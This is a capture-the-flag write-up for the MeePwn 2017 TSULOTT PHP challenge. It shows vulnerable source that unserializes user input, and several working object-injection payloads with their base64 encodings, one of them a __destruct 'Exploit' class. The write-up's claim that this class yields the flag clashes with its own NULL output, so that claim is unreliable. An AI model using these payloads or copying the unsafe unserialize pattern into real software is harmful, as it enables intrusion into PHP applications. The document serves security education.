#### First thing first: this is the php code, read it in raw



<?php
class Object 
{ 
  var $jackpot;
  var $enter; 
}
?>


<?php

include('secret.php');

if(isset($_GET['input']))  
{
  $obj = unserialize(base64_decode($_GET['input']));
  if($obj)
  {
    $obj->jackpot = rand(10,99).' '.rand(10,99).' '.rand(10,99).' '.rand(10,99).' '.rand(10,99).' '.rand(10,99); 
    if($obj->enter === $obj->jackpot)
    {
      echo "<center><strong><font color='white'>CONGRATULATION! You Won JACKPOT PriZe !!! </font></strong></center>". "<br><center><strong><font color='white' size='20'>".$obj->jackpot."</font></strong></center>";
      echo "<br><center><strong><font color='green' size='25'>".$flag."</font></strong></center><br>";
      echo "<centerx><imgxx src=' ' /></center>";

    }
    else
    {
      echo "<br><br><center><strong><font color='white'>Wrong! True Six Numbers Are: </font></strong></center>". "<br><center><strong><font color='white' size='25'>".$obj->jackpot."</font></strong></center><br>";
    }
  }
  else
  {
    echo "<center><strong><font color='white'>- Something wrong, do not hack us please! -</font></strong></center>";
  }
}
else
{
  echo "";
}
?>
<center>
<br><h2><font color='yellow' size=8>-- TSU</font><font color='red' size=8>LOTT --</font></h2>
<p><p><font color='white'>Input your code to win jackpot!</font><p>
<form>
          <input type="text" name="input" /><p><p>
          <button type="submit" name="btn-submit" value="go">send</button>
</form>
</center>
<?php
if (isset($_GET['gen_code']) && !empty($_GET['gen_code']))
{
  $temp = new Object;
  $temp->enter=$_GET['gen_code'];
  $code=base64_encode(serialize($temp)); 
  echo '<center><font color=\'white\'>Here is your code, please use it to Lott: <strong>'.$code.'</strong></font></center>';
}
?>
<center>
<font color='white'>-----------------------------------------------------------------------------------------------------------------------------</font>
<h3><font color='white'>Take code</font></h3><p>
<p><font color='white'>Pick your six numbers (Ex: 15 02 94 11 88 76)</font><p>
<form>
      <input type="text" name="gen_code" maxlength="17" /><p><p>
      <button type="submit" name="btn-submit" value="go">send</button>
</form>
</center>
<!-- debug: GET is_debug=1 -->
<?php
if(isset($_GET['is_debug']) && $_GET['is_debug']==='1')
{
   show_source(__FILE__);
}
?>

### The important part is unserialize(base64_decode($_GET['input']));

### In The HTML, There will be 2 input: one is to serialize and the other is to unserilize it

- At first I was think about pointing the $obj->enter become $obj->jackpot, but it doesn't really work

- The second method would be create another serialize object outside **(fake object)** and make $obj->enter == $obj->jackpot


<?php
class Objects {
	var $jackpot;
	var $enter;

	function __construct() {
		$this->enter = &$this->jackpot;
	}
}
$input = new Objects();
echo base64_encode(serialize($input));
?>

### Some other way:
1. elegura.wolfe (english) (fake object way): https://advancedpersistentjest.com/2017/07/17/writeup-tsulott-meepwn/
2. clayday (english) (reference way): http://blog.clayday.id/tsulott-meepwn-ctf-2017-writeup/
3. foo-manroot (english) (dumping data via magic _destruct, but i think the author is wrong, its still compare null): https://foomanroot.github.io/post/ctf/meepwn/write-up/2017/09/28/meepwn-web.html
4. bl4ckpr15m (english) (compare null): https://github.com/bl4ckpr15m/CTF-Writeups/blob/master/2017/MeePwn/web/TSULOTT/writeup%20%5Bby%20Jorge%20Chato%5D.md 

#### 1.Fake object:
- An “object” class is also defined in the source code:

class Object 
{ 
 var $jackpot;
 var $enter; 
}

- The path to explotiation lies in creating a fake object, called something else (not “Object”, which seems to cause PHP to use it’s own class definition), which passes the “$obj->enter === $obj->jackpot” check, but doesn’t allow $obj->jackpot to be overwritten. Helpfully, PHP allows us to define “protected” properties, which cannot be modified, as per below:

class Test{
 protected $_data = array(
 "jackpot" => "12345"
 );
 var $enter;
}

#### 3. Cool way:

$ php -a
Interactive mode enabled

php > class Exploit
php > {
php {	function __destruct ()
php {	{
php {		var_dump ($flag);
php {	}
php { }
php > echo base64_encode (serialize (new Exploit ()));
PHP Notice:  Undefined variable: flag in php shell code on line 5
NULL
Tzo3OiJFeHBsb2l0IjowOnt9
php >

When we request /?input=Tzo3OiJFeHBsb2l0IjowOnt9, we get the flag:


#### 4.Just create a object, NULL is cool:
Our only chance is generate a completely random object and encoded with base64.
- [https://www.tools4noobs.com/online_php_functions/base64_encode/](https://www.tools4noobs.com/online_php_functions/base64_encode/)
- Generate a random object, in this case an object Test who have 2 attributes (jackpot and enter) both of them NULL
    ```json
        INPUT: O:4:"Test":2:{s:7:"jackpot";N;s:5:"enter";N;}
    ```
    ```json
        OUTPUT: "Tzo0OiJUZXN0IjoyOntzOjc6ImphY2twb3QiO047czo1OiJlbnRlciI7Tjt9"
    ```


